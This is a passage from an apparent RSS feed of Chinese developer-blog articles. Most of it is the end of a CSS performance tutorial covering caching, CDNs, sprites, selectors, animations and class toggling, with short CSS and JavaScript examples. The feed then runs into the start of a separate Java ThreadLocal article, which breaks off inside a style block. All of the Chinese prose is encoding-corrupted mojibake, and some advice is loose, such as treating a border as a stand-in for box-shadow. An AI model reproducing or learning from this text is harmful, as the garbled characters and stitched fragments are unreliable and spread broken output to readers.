<p>å¯ä»¥ä½¿ç”¨æµè§ˆå™¨ç¼“å­˜æ¥ç¼“å­˜ CSS æ–‡ä»¶ï¼Œä»è€Œåœ¨é¡µé¢åŠ è½½æ—¶åŠ å¿«é€Ÿåº¦ã€‚å¯ä»¥è®¾ç½®é€‚å½“çš„ç¼“å­˜æ—¶é—´æ¥ç¡®ä¿æ–‡ä»¶åœ¨å¿…è¦æ—¶èƒ½å¤Ÿæ›´æ–°ã€‚</p>
<h3 data-id="heading-10">2.5 ä½¿ç”¨ CDN åŠ é€Ÿ</h3>
<ul>
<li>ä½¿ç”¨ <strong>CDNï¼ˆå†…å®¹åˆ†å‘ç½‘ç»œï¼‰</strong> å¯ä»¥å°† CSS æ–‡ä»¶åˆ†å‘åˆ°å…¨å›½å„ä¸ª <code>CDN</code> èŠ‚ç‚¹çš„æœåŠ¡å™¨ä¸Šï¼Œç”¨æˆ·å¯ä»¥å°±è¿‘ä¸‹è½½ï¼Œä»è€ŒåŠ å¿«åŠ è½½é€Ÿåº¦ï¼Œä¹Ÿå¯ä»¥å‡å°‘è‡ªå·±æœåŠ¡å™¨çš„è´Ÿè½½ã€‚</li>
<li>å¦‚æœé™æ€èµ„æºå¾ˆå¤šï¼Œå¯ä»¥å‡†å¤‡å¤šä¸ªé™æ€æœåŠ¡å™¨åŸŸåï¼Œæ¯”å¦‚åŸŸåæ˜¯ <code>static.xx.com</code>ï¼Œåšæˆæ”¯æŒ <code>static0-5</code> çš„ 6 ä¸ªåŸŸå, ä¹Ÿå°±æ˜¯ <code>static0.xx.comã€static1.xx.comã€static2.xx.com...</code>ï¼Œæ¯æ¬¡è¯·æ±‚æ—¶éšæœºé€‰ä¸€ä¸ªåŸŸååœ°å€è¿›è¡Œè¯·æ±‚ï¼Œè¿™æ ·å¯ä»¥ç»•è¿‡æµè§ˆå™¨åŒåŸŸåçš„è¿æ¥æ•°é™åˆ¶ï¼ˆä¸€èˆ¬æ˜¯é™åˆ¶ 6 ä¸ªï¼‰ï¼Œ6 ä¸ªåŸŸåå°±å¯ä»¥åŒæ—¶å‘é€ 36 ä¸ªè¿æ¥è¯·æ±‚ã€‚å½“ç„¶ï¼Œè¿™ä¸ªåŸŸåä¸ªæ•°ä¸æ˜¯è¶Šå¤šè¶Šå¥½ï¼Œå¤ªåˆ†æ•£çš„è¯åˆä¼šæ¶‰åŠåˆ°å¤šåŸŸåæ— æ³•ç¼“å­˜é™æ€èµ„æºçš„é—®é¢˜ã€‚</li>
</ul>
<h3 data-id="heading-11">2.6 ä½¿ç”¨ CSS Sprite</h3>
<p><strong>CSS Sprite</strong> æŠ€æœ¯å°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„<strong>é›ªç¢§å›¾</strong>ï¼Œé€šè¿‡å°†å¤šå¼ å°å›¾æ ‡æ‹¼æ¥æˆä¸€å¼ å¤§å›¾ï¼Œèƒ½æœ‰æ•ˆçš„<strong>å‡å°‘HTTPè¯·æ±‚æ•°é‡</strong>ä»¥è¾¾åˆ°åŠ é€Ÿæ˜¾ç¤ºå†…å®¹çš„æŠ€æœ¯ã€‚</p>
<h3 data-id="heading-12">2.7 CSS æ ·å¼æŠ½ç¦»å’Œå»é™¤æ— ç”¨ CSS</h3>
<ul>
<li>å¹³æ—¶å¼€å‘è¿‡ç¨‹ä¸­å¯ä»¥å°†ä¸€äº›<strong>å¯å¤ç”¨</strong>çš„ CSS æŠ½ç¦»åˆ°ä¸€ä¸ªå•ç‹¬æ–‡ä»¶ä¸­ï¼Œå‡å°‘ CSS ä»£ç å†—ä½™ã€‚</li>
<li>åœ¨æ‰“åŒ…æ„å»ºæ—¶å¯ä»¥åˆ©ç”¨ä¸€äº›æ’ä»¶å»é™¤æ²¡æœ‰ç”¨åˆ°çš„ CSSï¼Œç›¸å½“äºå¯¹ CSS è¿›è¡Œ <code>Tree shaking</code>ï¼Œå‡å°‘æ‰“åŒ…åä½“ç§¯ã€‚</li>
</ul>
<h3 data-id="heading-13">2.8 åˆç†ä½¿ç”¨å†…åµŒ CSS</h3>
<p><code>å†…åµŒCSS</code> ä¹Ÿå°±æ˜¯é€šè¿‡å…ƒç´ çš„ <code>style</code> æ¥ä¹¦å†™è¡Œå†…æ ·å¼ï¼Œæ¯”å¦‚ <code>&lt;div style="color: red"&gt;&lt;/div&gt;</code>ï¼Œå®ƒçš„ä¼˜ç¼ºç‚¹å¦‚ä¸‹ï¼š</p>
<p><strong>ä¼˜ç‚¹</strong>ï¼š</p>
<ul>
<li>ä¸ä½¿ç”¨ <code>link</code> æ ‡ç­¾ç›¸æ¯”ï¼Œå¯ä»¥å‡å°‘ CSS çš„ <code>http</code> è¯·æ±‚é‡ã€‚</li>
</ul>
<p><strong>ç¼ºç‚¹</strong>ï¼š</p>
<ul>
<li>å¢åŠ  <code>html</code> æ–‡ä»¶çš„ä½“ç§¯ã€‚</li>
<li>ä½¿ç”¨ <code>link</code> æ ‡ç­¾èƒ½å¾ˆå¥½çš„åˆ©ç”¨æµè§ˆå™¨çš„ç¼“å­˜ï¼Œè€Œå†…è”æ ·å¼æ”¾åœ¨ <code>html</code> é‡Œé¢ï¼Œèƒ½å¦ä½¿ç”¨ç¼“å­˜éœ€è¦çœ‹ <code>html</code> æ–‡ä»¶çš„ç¼“å­˜ç­–ç•¥ã€‚</li>
</ul>
<p>ç»¼åˆå®ƒçš„ä¼˜ç¼ºç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©å°†ä¸€äº›<strong>ä½“ç§¯å°çš„é¦–å±å…³é”® CSS</strong> å†…è”åˆ° <code>html</code> æ–‡ä»¶ä¸­ï¼ŒåŠ å¿«é¦–å±æ¸²æŸ“é€Ÿåº¦ã€‚</p>
<h2 data-id="heading-14">3ã€CSS é€‰æ‹©å™¨æ€§èƒ½ä¼˜åŒ–</h2>
<h3 data-id="heading-15">3.1 é¿å…ä½¿ç”¨é€šé…ç¬¦é€‰æ‹©å™¨</h3>
<p>é€šé…ç¬¦é€‰æ‹©å™¨<code>*</code>ç¬¦å·å¯ä»¥åŒ¹é…ä»»ä½•å…ƒç´ ï¼Œä½†æ˜¯è¿™ä¼šå¯¼è‡´æµè§ˆå™¨éœ€è¦éå†æ•´ä¸ªæ–‡æ¡£æ ‘æ¥æŸ¥æ‰¾åŒ¹é…çš„å…ƒç´ ï¼Œä»è€Œé™ä½æ€§èƒ½ã€‚</p>
<h3 data-id="heading-16">3.2 ä½¿ç”¨å­é€‰æ‹©å™¨ä»£æ›¿åä»£é€‰æ‹©å™¨</h3>
<p>åä»£é€‰æ‹©å™¨ï¼ˆå¦‚ <code>.parent .child</code>ï¼‰ä¼šæ£€æŸ¥æ‰€æœ‰åä»£å…ƒç´ ï¼Œè€Œå­é€‰æ‹©å™¨ï¼ˆå¦‚ <code>.parent &gt; .child</code>ï¼‰åªæ£€æŸ¥ç›´æ¥å­å…ƒç´ ï¼ŒåŒ¹é…èŒƒå›´æ›´å°ï¼Œæ€§èƒ½æ›´å¥½ã€‚</p>
<h3 data-id="heading-17">3.3 ä¼˜å…ˆä½¿ç”¨ç±»ï¼ˆClassï¼‰å’Œ ID é€‰æ‹©å™¨</h3>
<p>ç±»é€‰æ‹©å™¨ï¼ˆå¦‚ <code>.box</code>ï¼‰å’Œ ID é€‰æ‹©å™¨ï¼ˆå¦‚ <code>#box</code>ï¼‰åŒ¹é…é€Ÿåº¦æ›´å¿«ï¼Œå› ä¸ºå®ƒä»¬ç›´æ¥æŒ‡å‘ç‰¹å®šå…ƒç´ ã€‚é¿å…æ ‡ç­¾é€‰æ‹©å™¨ï¼ˆå¦‚ <code>div</code>ï¼‰æˆ–å±æ€§é€‰æ‹©å™¨ï¼ˆå¦‚ [type="text"]ï¼‰ï¼Œåè€…åŒ¹é…æ›´åŠ å®½æ³›ï¼Œæ•ˆç‡è¾ƒä½ï¼Œå°¤å…¶åœ¨å¤§å‹ DOM ä¸­ã€‚</p>
<h3 data-id="heading-18">3.4 é¿å…æ·±å±‚åµŒå¥—çš„é€‰æ‹©å™¨</h3>
<p>å‰é¢ä¹Ÿè¯´è¿‡ï¼ŒCSS é€‰æ‹©å™¨éœ€è¦ä»å³å¾€å·¦å»åŒ¹é…çš„ï¼ŒåµŒå¥—çš„é€‰æ‹©å™¨å¦‚ <code>.header div ul li a</code>ï¼Œå› ä¸ºæµè§ˆå™¨éœ€è¦éå†æ›´å¤š DOM èŠ‚ç‚¹ã€‚å»ºè®®é™åˆ¶é€‰æ‹©å™¨æ·±åº¦åœ¨ 3 å±‚ä»¥å†…ï¼Œä½¿ç”¨æ›´ç›´æ¥çš„ç±»æˆ– ID é€‰æ‹©å™¨ï¼Œå¦‚ <code>.box</code>ã€‚è¿™èƒ½å‡å°‘åŒ¹é…æ—¶é—´ã€‚æˆ–è€…ä½¿ç”¨ <code>BEM</code> å‘½åè§„èŒƒï¼Œæ¯”å¦‚ <code>.block__element--modifier</code>ï¼Œæé«˜åŒ¹é…æ•ˆç‡ã€‚</p>
<p>å¦å¤–åœ¨ä½¿ç”¨ ID é€‰æ‹©å™¨çš„æ—¶å€™ï¼Œå‰é¢å°±éœ€è¦åŠ ä¸Šçˆ¶çº§çš„é€‰æ‹©å™¨ï¼Œæ¯”å¦‚ä¸æ¨èç”¨ <code>.box #content</code>ï¼Œæ¨èç”¨ <code>#content</code>ã€‚</p>
<h2 data-id="heading-19">4ã€CSS å±æ€§æ€§èƒ½ä¼˜åŒ–</h2>
<h3 data-id="heading-20">4.1 é¿å…ä½¿ç”¨è¿‡äºå¤æ‚çš„å±æ€§</h3>
<p>è¿‡äºå¤æ‚çš„å±æ€§ä¼šå¢åŠ æµè§ˆå™¨çš„æ¸²æŸ“è´Ÿæ‹…ï¼Œä»è€Œé™ä½æ€§èƒ½ã€‚åº”è¯¥å°½é‡ä½¿ç”¨ç®€å•çš„å±æ€§æ¥å®ç°éœ€è¦çš„æ ·å¼æ•ˆæœï¼Œæ¯”å¦‚ä¸‹é¢è¿™äº›å±æ€§ï¼š</p>
<ul>
<li><strong>box-shadow</strong>ï¼šbox-shadow å±æ€§å¯ä»¥å®ç°ç›’å­çš„é˜´å½±æ•ˆæœï¼Œä½†æ˜¯å®ƒä¼šå¢åŠ æµè§ˆå™¨çš„è®¡ç®—å’Œæ¸²æŸ“æˆæœ¬ã€‚å¦‚æœè¦å®ç°ä¸€ä¸ªç®€å•çš„è¾¹æ¡†æ•ˆæœï¼Œå¯ä»¥ä½¿ç”¨ <code>border</code> å±æ€§æ¥æ›¿ä»£ã€‚</li>
</ul>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* ä¸æ¨èä½¿ç”¨ */</span>
<span class="hljs-selector-class">.box</span> {
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> <span class="hljs-number">#888</span>;
}

<span class="hljs-comment">/* æ¨èä½¿ç”¨ */</span>
<span class="hljs-selector-class">.box</span> {
  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#888</span>;
}
</code></pre>
<ul>
<li><strong>filter</strong>ï¼šfilter å±æ€§å¯ä»¥å®ç°å›¾åƒçš„æ»¤é•œæ•ˆæœï¼Œä½†æ˜¯å®ƒä¼šå¢åŠ æµè§ˆå™¨çš„è®¡ç®—å’Œæ¸²æŸ“æˆæœ¬ã€‚å¦‚æœè¦å®ç°ä¸€ä¸ªç®€å•çš„é¢œè‰²å˜æ¢æ•ˆæœï¼Œå¯ä»¥ä½¿ç”¨ <code>background-color</code> å±æ€§æ¥æ›¿ä»£ã€‚</li>
</ul>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* ä¸æ¨èä½¿ç”¨ */</span>
<span class="hljs-selector-class">.box</span> {
  <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">grayscale</span>(<span class="hljs-number">50%</span>);
}

<span class="hljs-comment">/* æ¨èä½¿ç”¨ */</span>
<span class="hljs-selector-class">.box</span> {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ccc</span>;
}
</code></pre>
<p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™äº›æ›¿ä»£æ–¹æ¡ˆå¯èƒ½ä¼šæœ‰ä¸€äº›<strong>å±€é™æ€§</strong>ï¼Œæ— æ³•å®Œå…¨å–ä»£åŸæ¥çš„å±æ€§ã€‚å› æ­¤ï¼Œåœ¨ä½¿ç”¨è¿™äº›æ›¿ä»£æ–¹æ¡ˆæ—¶ï¼Œéœ€è¦æ ¹æ®å…·ä½“çš„éœ€æ±‚å’Œæƒ…å†µè¿›è¡Œé€‰æ‹©ã€‚</p>
<h3 data-id="heading-21">4.2 é¿å…ä½¿ç”¨ä¸å¿…è¦çš„å±æ€§</h3>
<p>ä¸å¿…è¦çš„å±æ€§ä¼šå¢åŠ  <code>CSS</code> æ–‡ä»¶çš„å¤§å°ï¼Œä»è€Œé™ä½åŠ è½½é€Ÿåº¦ã€‚åº”è¯¥å°½é‡é¿å…ä½¿ç”¨ä¸å¿…è¦çš„å±æ€§ã€‚</p>
<h3 data-id="heading-22">4.3 é¿å…ä½¿ç”¨ !important</h3>
<p><code>!important</code> ä¼šè¦†ç›–å…¶ä»–æ ·å¼ï¼Œä»è€Œå¢åŠ æ¸²æŸ“æ—¶é—´ã€‚è€Œä¸”å®ƒä¸å®¹æ˜“è¢«æ›¿æ¢æˆ–è¦†ç›–ï¼ŒåæœŸå¯ç»´æŠ¤æ€§ä¹Ÿæ¯”è¾ƒå·®ï¼Œæ›´å¥½çš„æ–¹å¼ä½¿ç”¨æ›´å…·ä½“ã€æ›´å‡†ç¡®çš„é€‰æ‹©å™¨æ¥å®šä¹‰æ ·å¼ã€‚</p>
<h2 data-id="heading-23">5ã€CSS åŠ¨ç”»æ€§èƒ½ä¼˜åŒ–</h2>
<h3 data-id="heading-24">5.1 ä½¿ç”¨ transform å’Œ opacity å±æ€§æ¥è¿›è¡ŒåŠ¨ç”»</h3>
<p>ä½¿ç”¨ <code>transform</code> å’Œ <code>opacity</code> å±æ€§å¯ä»¥å‡å°‘æµè§ˆå™¨çš„æ¸²æŸ“è´Ÿæ‹…ï¼Œä»è€Œæé«˜æ€§èƒ½ã€‚</p>
<h3 data-id="heading-25">5.2 é¿å…ä½¿ç”¨è¿‡äºå¤æ‚çš„åŠ¨ç”»æ•ˆæœ</h3>
<p>è¿‡äºå¤æ‚çš„åŠ¨ç”»æ•ˆæœä¼šå¢åŠ æµè§ˆå™¨çš„æ¸²æŸ“è´Ÿæ‹…ï¼Œä»è€Œé™ä½æ€§èƒ½ã€‚åº”è¯¥å°½é‡ä½¿ç”¨ç®€å•çš„åŠ¨ç”»æ•ˆæœã€‚</p>
<h3 data-id="heading-26">5.3 åœ¨åŠ¨ç”»ä¸­ä½¿ç”¨ will-change å±æ€§</h3>
<p><code>will-change</code> å±æ€§å¯ä»¥å‘Šè¯‰æµè§ˆå™¨å“ªäº›å±æ€§å°†è¦è¢«æ”¹å˜ï¼Œä»è€Œæå‰è¿›è¡Œä¼˜åŒ–ï¼Œå‡å°‘æ¸²æŸ“è´Ÿæ‹…ã€‚</p>
<h3 data-id="heading-27">5.4 ä½¿ç”¨ requestAnimationFrame() å‡½æ•°æ¥ä¼˜åŒ–åŠ¨ç”»</h3>
<p><code>requestAnimationFrame()</code> å‡½æ•°å¯ä»¥åœ¨æµè§ˆå™¨ä¸‹ä¸€æ¬¡æ¸²æŸ“ä¹‹å‰æ‰§è¡Œä»£ç ï¼Œä»è€Œå‡å°‘æ¸²æŸ“è´Ÿæ‹…ï¼Œæé«˜æ€§èƒ½ã€‚</p>
<h2 data-id="heading-28">6ã€CSS æ¸²æŸ“æ€§èƒ½ä¼˜åŒ–</h2>
<h3 data-id="heading-29">6.1 ä½¿ç”¨ class åˆå¹¶ DOM çš„ä¿®æ”¹</h3>
<p>æ¯”å¦‚æˆ‘ä»¬éœ€è¦æ ¹æ®ä¸åŒæƒ…å†µç»™ä¸€ä¸ªå…ƒç´ æ·»åŠ ä¸åŒçš„æ ·å¼ï¼Œå¯èƒ½ä¼šå†™å‡ºå¦‚ä¸‹çš„ä»£ç ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> el = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.box'</span>);
<span class="hljs-keyword">if</span> (isHover) {
  el.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = <span class="hljs-string">'red'</span>;
  el.<span class="hljs-property">style</span>.<span class="hljs-property">background</span> = <span class="hljs-string">'blue'</span>;
} <span class="hljs-keyword">else</span> {
  el.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = <span class="hljs-string">'blue'</span>;
  el.<span class="hljs-property">style</span>.<span class="hljs-property">background</span> = <span class="hljs-string">'red'</span>;
}
</code></pre>
<p>è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸¤ä¸ª <code>class</code> ç±»ï¼Œç„¶åç›´æ¥åˆ‡æ¢ç±»åå³å¯ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> el = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.box'</span>);
<span class="hljs-keyword">if</span> (isHover) {
  el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'normal'</span>);
  el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'hover'</span>);
} <span class="hljs-keyword">else</span> {
  el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'hover'</span>);
  el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'normal'</span>);
}
</code></pre>
<h3 data-id="heading-30">6.2 è®© DOM å…ƒç´ è„±ç¦»æ–‡æ¡£æµ</h3>
<p>ä½¿ç”¨ <code>absoulte</code> æˆ–è€… <code>fixed</code> å®šä½è®© DOM å…ƒç´ è„±ç¦»æ–‡æ¡£æµï¼Œè¿™æ ·åœ¨ä¿®æ”¹ DOM å…ƒç´ çš„æ—¶å€™ä¸ä¼šå½±å“åˆ°å…¶ä»– DOM å…ƒç´ çš„å¸ƒå±€ï¼Œä»è€Œæé«˜æ¸²æŸ“æ€§èƒ½ã€‚</p>
<h2 data-id="heading-31">7ã€æ€»ç»“</h2>
<p>æœ¬æ–‡ä¸»è¦é€šè¿‡<strong>CSS åŠ è½½æ€§èƒ½ä¼˜åŒ–</strong>ã€<strong>CSS é€‰æ‹©å™¨æ€§èƒ½ä¼˜åŒ–</strong>ã€<strong>CSS å±æ€§æ€§èƒ½ä¼˜åŒ–</strong>ã€<strong>CSS åŠ¨ç”»æ€§èƒ½ä¼˜åŒ–</strong>å’Œ<strong>CSS æ¸²æŸ“æ€§èƒ½ä¼˜åŒ–</strong>è¿™äº›æ–¹å‘ä»‹ç»äº† CSS çš„æ€§èƒ½ä¼˜åŒ–æŠ€å·§ã€‚é€šè¿‡ä¼˜åŒ– CSS æ€§èƒ½ï¼Œå¯ä»¥æé«˜ç½‘ç«™çš„æ€§èƒ½å’Œç”¨æˆ·ä½“éªŒã€‚</p>
<p>åœ¨å®é™…å¼€å‘ä¸­ï¼Œå¯æ ¹æ®å®é™…ä¸šåŠ¡åœºæ™¯å’Œéœ€è¦å»è¿›è¡Œä¼˜åŒ–ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä» JDK1.2 åˆ° JDK21ï¼šThreadLocalçš„è¿›åŒ–è§£å†³äº†ä»€ä¹ˆé—®é¢˜]]></title>    <link>https://juejin.cn/post/7575367791272804390</link>    <guid>https://juejin.cn/post/7575367791272804390</guid>    <pubDate>2025-11-23T09:55:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575367791272804390" data-draft-id="7575182522411335718" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä» JDK1.2 åˆ° JDK21ï¼šThreadLocalçš„è¿›åŒ–è§£å†³äº†ä»€ä¹ˆé—®é¢˜"/> <meta itemprop="keywords" content="åç«¯,Java,é¢è¯•"/> <meta itemprop="datePublished" content="2025-11-23T09:55:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€åªå«ç…¤çƒçš„çŒ«"/> <meta itemprop="url" content="https://juejin.cn/user/1732486058745054"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä» JDK1.2 åˆ° JDK21ï¼šThreadLocalçš„è¿›åŒ–è§£å†³äº†ä»€ä¹ˆé—®é¢˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1732486058745054/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€åªå«ç…¤çƒçš„çŒ«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T09:55:30.000Z" title="Sun Nov 23 2025 09:55:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 